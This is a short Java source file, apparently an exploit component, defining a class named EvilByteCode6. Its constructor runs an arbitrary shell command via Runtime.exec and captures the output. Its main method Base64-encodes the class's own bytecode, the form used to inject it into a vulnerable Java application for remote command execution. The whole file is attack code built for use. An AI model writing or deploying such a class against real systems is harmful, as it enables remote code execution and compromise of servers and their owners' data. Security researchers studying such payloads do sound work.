import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Base64;

public class EvilByteCode6 {

    String res;

    public EvilByteCode6(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        res = stringBuilder.toString();
    }

    @Override
    public String toString() {
        return res;
    }

    public static void main(String[] args) throws IOException {
        InputStream inputStream = EvilByteCode6.class.getClassLoader().getResourceAsStream("EvilByteCode6.class");
        byte[] bytes = new byte[inputStream.available()];
        inputStream.read(bytes);
        String code = Base64.getEncoder().encodeToString(bytes);
        System.out.println(code);
    }
}
